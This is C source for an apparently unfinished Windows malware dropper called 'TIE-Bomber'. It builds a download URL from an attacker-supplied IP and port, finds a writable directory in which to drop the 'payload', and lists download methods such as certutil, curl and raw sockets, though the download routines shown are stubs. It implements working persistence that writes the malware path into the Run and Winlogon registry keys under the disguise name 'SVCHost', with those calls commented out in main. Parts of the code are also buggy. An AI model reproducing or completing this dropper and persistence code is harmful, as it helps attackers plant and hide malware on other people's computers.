#include <ctype.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <windows.h>
#include <stdarg.h>

#define PERS_NAME "SVCHost"
#define MAX_URL 2048
#define MAX_FILE 255

#define WIN_ERROR 0x0
#define CONTINUE_ERROR 0x1 
#define FAIL_ERROR 0x2
#define SUCCESS 0x3

typedef int (*ValidatorFunc)(char *arg, void *data);

VOID TranslateErrorPrintImpl(DWORD errCode, const char *file, int line);

VOID _ListOpts(const char *str, ...);
#define ListOpts(...) _ListOpts(__VA_ARGS__, NULL)

#define TranslateErrorPrint(errCode) TranslateErrorPrintImpl(errCode, __FILE__, __LINE__);

typedef struct _WRITABLE_DIR {
    char path[MAX_PATH + 1];
} WRITABLE_DIR, *PWRITABLE_DIR;

static BOOL printHelp = TRUE;

VOID _ListOpts(const char *str, ...) {
    int o=0;
    va_list arg;
    va_start(arg, str);
    for (int i=0;i<20;i++) printf("%c", '-');
    printf("\n\n");
    printf("[0]: Just give me something that works\n");
    while (str) {
        printf("[%d]: %s\n", ++o, str);
        str = va_arg(arg, const char *);
    }
    printf("[h]: List options again\n");
    printf("[q]: Quit program\n\n");

    for (int i=0;i<20;i++) printf("%c", '-');
    printf("\n\n");

    va_end(arg);
}

BOOL PromptUntilValid(const char *prompt, char* buffer, size_t bufferSize, ValidatorFunc validator, void *data) {
    int rc;

    while (TRUE) {
        printf("TIE-Bomber(%s) > ", prompt);
        fflush(stdout);
        fgets(buffer, (int)bufferSize, stdin);
        buffer[strcspn(buffer, "\n")] = '\0';
        if (strcmp(buffer, "q") == 0 || strcmp(buffer, "quit") == 0 || strcmp(buffer, "exit") == 0) {
                printf("[*] Exiting...\n");
                return FALSE;
        }
        if (strcmp(buffer, "h") == 0) {
            printHelp = TRUE;
        }

        rc = validator(buffer, data);
        if (rc == WIN_ERROR) {
            TranslateErrorPrint(GetLastError());
            continue;
        } else if (rc == CONTINUE_ERROR || rc == FAIL_ERROR) {
            continue;
        }
        break;
    }
}

BOOL AddWritableDir(WRITABLE_DIR **array, int *count, int *capacity, const char *path, int pathLen) {
    if (*count >= *capacity) {
        *capacity = (*capacity == 0) ? 16 : (*capacity * 2);
        *array = realloc(*array, (*capacity) * sizeof(WRITABLE_DIR));
        if (!*array) {
            printf("[-] Allocation failed");
            return FALSE;
        }
    }
    
    strncpy((*array)[*count].path, path, pathLen);
    (*array)[*count].path[pathLen] = '\0';
    (*count)++;

    return TRUE;
}

VOID TranslateError(DWORD errCode, char **pErrMessage) {
	FormatMessageA(
	    FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
	    NULL,
	    errCode,
	    0,
	    (LPSTR)pErrMessage,
	    0,
	    NULL);
}

VOID TranslateErrorPrintImpl(DWORD errCode, const char *file, int line) {
    char* errMsg;
    TranslateError(errCode, &errMsg);
    fprintf(stderr, "[-] ERROR at %s:%d: %lu - %s", file, line, errCode, errMsg);
    LocalFree(errMsg);
}

BOOL FileExists(const char *path) {
	DWORD attrib = GetFileAttributesA(path);
	return (attrib != INVALID_FILE_ATTRIBUTES && !(attrib & FILE_ATTRIBUTE_DIRECTORY));
}
    
BOOL IsExecutable(const char *path) {
	DWORD binaryType;
	LSTATUS stat = GetBinaryTypeA((LPCSTR)path, (LPDWORD)&binaryType);
	char *errMsg;
	DWORD errCode;
	if (stat == ERROR) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] Error: %s\n", errMsg);
		LocalFree(errMsg);
		return FALSE;
	}

	return TRUE;
}

BOOL DownloadFromUrl(const char* source) {
    printf("[+] Downloading the payload using Win32 API\n");
    return FALSE;
}

BOOL DownloadWget(const char *source) {
    printf("[+] Downloading the payload using wget\n");
    return TRUE;
}

int HandleDownload(char* opt, void *data) {
    char *src = (char*) data;
    if (printHelp) {
        ListOpts(
            "Download using Win32 API", 
            "Download using certutil.exe", 
            "Download using wget", 
            "Download using curl",
            "Download using raw TCP sockets"  
        );
        printHelp = FALSE;
        return CONTINUE_ERROR;
    }

    switch ((char) *opt) {
        case '0':
           break; 
        case '1':
            if (!DownloadFromUrl(src)) {
                return FAIL_ERROR;
            }
            return SUCCESS;
        case '2':
            break;
        case '3':
            if (!DownloadWget(src)) {
                return FAIL_ERROR;
            }
            return SUCCESS;
        case '4': 
            break;
        case '5':
            break;
        default:
            printf("[?] Unknown option specified. Select <h> for available options\n");
            return -1;
            break;
    }
}

int HasWriteAccess(char *dirPath, void *data) {
    (void) data;

    char testPath[MAX_PATH + 1];
    if (dirPath[strlen(dirPath) - 1] != '\\') {
        dirPath[strlen(dirPath)] = '\\';
    }
    snprintf(testPath, MAX_PATH, "%s__perm__.tmp", dirPath);
    
    wchar_t wTestPath[MAX_PATH + 1];
    MultiByteToWideChar(CP_UTF8, 0, testPath, -1, wTestPath, MAX_PATH);


    HANDLE hFile = CreateFileW(
        wTestPath,
        FILE_WRITE_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return WIN_ERROR;
    }

    CloseHandle(hFile);
    return SUCCESS;
}

BOOL InjectRunRegistry(const char *malwareFull, int malwareFullLen) {
	HKEY hKey = NULL;
	const char *REG = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	DWORD errCode;
	char *errMsg = NULL;

	// Get our handle to the registry
	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)REG, 0, KEY_WRITE, &hKey);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while opening the Run registry key: %s\n", errMsg);
		LocalFree(errMsg);
		return FALSE;
	}

	// Add to the registry key, the path to our malware
	result = RegSetValueEx(hKey, (LPCSTR)PERS_NAME, 0, REG_SZ, (unsigned char *)malwareFull, malwareFullLen);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while setting registry key: %s\n", errMsg);
		LocalFree(errMsg);
		RegCloseKey(hKey);
		return FALSE;
	}

	printf("Run registry key set for: %s\n", malwareFull);
	return TRUE;
}

BOOL InjectWinlogonRegistry(const char *malwareFull, int malwareFullLen) {
	HKEY hKey = NULL;
	const char *REG = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
	DWORD errCode;
	char *errMsg = NULL;

	// Get our handle to the registry
	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)REG, 0, KEY_WRITE, &hKey);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while opening the Winlogon registry key: %s\n", errMsg);
		LocalFree(errMsg);
		return FALSE;
	}

	// Add to the registry key, the path to our malware
	result = RegSetValueEx(hKey, (LPCSTR)PERS_NAME, 0, REG_SZ, (unsigned char *)malwareFull, malwareFullLen);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while setting registry key: %s\n", errMsg);
		LocalFree(errMsg);
		RegCloseKey(hKey);
		return FALSE;
	}

	printf("Winlogon registry key set for: %s\n", malwareFull);
	return TRUE;
}

BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *exeLen, char *target, int *targetLen, int *port) {
	int opt;
	int iFlag = 0, eFlag = 0, tFlag = 0;
	*port = 80;
	while ((opt = getopt(argc, argv, "i:e:t:p:")) != -1) {
		switch (opt) {
			case 'i':
				*ipLen = strlen(optarg);
				memcpy(ip, optarg, *ipLen);
				ip[*ipLen] = '\0';
                iFlag = 1;
				break;
			case 'e':
				*exeLen = strlen(optarg);
				memcpy(exe, optarg, *exeLen);
				exe[*exeLen] = '\0';
				eFlag = 1;
				break;
            case 't':
                *targetLen = strlen(optarg);
                memcpy(target, optarg, *targetLen);
                target[*targetLen] = '\0';
                tFlag = 1;
                break;
			case 'p':
				BOOL valid = TRUE;
				for (int i = 0; optarg[i]; i++) {
					if (!isdigit((unsigned char)optarg[i])) {
						valid = FALSE;
						break;
					}
				}
				if (valid) {
					*port = atoi(optarg);
				} else {
					printf("[-] Invalid port specified\n");
					return FALSE;
				}
                break;
			default:
				return FALSE;
				break;
		}
	}
	if (!iFlag || !eFlag) {
		return FALSE;
	}
    if (!tFlag) {
        *targetLen = *exeLen;
        strncpy(target, exe, (*exeLen) + 1);
    }
	return TRUE;
}

int main(int argc, char* argv[]) {
	char malwareFull[MAX_PATH];
	int malwareFullLen;
	char exe[MAX_FILE + 1];
    char ip[256];
    char target[MAX_FILE + 1];
    int ipLen;
	int exeLen;
    int targetLen; 
    int port; 
    char source[MAX_URL + 1];
    char targetDir[MAX_PATH + 1];
    char opt[16];

    char *errMsg;
    DWORD errCode;

    WRITABLE_DIR *wdirs = NULL;
    int capacity = 16, count = 0;

	if (ParseInput(argc, argv, ip, &ipLen, exe, &exeLen, target, &targetLen, &port) == FALSE) {
        printf("[!] Usage: %s -i <IP> -e <EXE> [-t <TARGET NAME>] [-p <PORT>]\n", argv[0]);
		exit(1);
	}

	snprintf(source, MAX_URL, "http://%s:%d/%s", ip, port, exe);
	printf("[*] Source to extract payload from: %s\n", source);
    printf("[*] Payload will be uploaded as: %s\n", target);

    if (!PromptUntilValid("Target Directory", targetDir, MAX_PATH, (ValidatorFunc) &HasWriteAccess, NULL)) {
        exit(1); 
    }
    printf("[+] Payload will be dropped to %s\n", targetDir);
    printf("\n\n[*] **DOWNLOAD OPTION**\n\n"); 
    HandleDownload(NULL, NULL);
    if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandleDownload, source)) {
        exit(1);
    }
    printf("\n\n[*] **PERSISTENCE OPTION**\n\n"); 
/*
	if (!FileExists(malware)) {
	    printf("[-] The malware does not exists\n");
	    return 1;
	}

	GetFullPathName(malware, MAX_PATH, malwareFull, NULL);
	malwareFullLen = strlen(malwareFull);
	malwareFull[malwareFullLen] = '\0';

	if (!IsExecutable(malwareFull)) {
	    return 1;
	}
	printf("[+] Valid malicious executable: %s\n[+] Starting to apply persistence techniques\n", malwareFull);
	*/
	// Try registry run key
	/*
	if (!InjectRunRegistry(malwareFull, malwareFullLen)) {
	    printf("[-] Persistence via Run Registry failed. Trying the next one\n");
	} else {
	    printf("[+] Persistence via Run Registry successful\n"); return 0; } */
	// Abusing Registry key used by Winlogon process
	/*
	if (!InjectWinlogonRegistry(malwareFull, malwareFullLen)) {
	    printf("[-] Persistence via Winlogon Registry failed. Trying the next one\n");
	} else {
	    printf("[+] Persistence via Winlogon Registry successful\n");
	    return 0;
	}
	*/
    
	return 0;
}
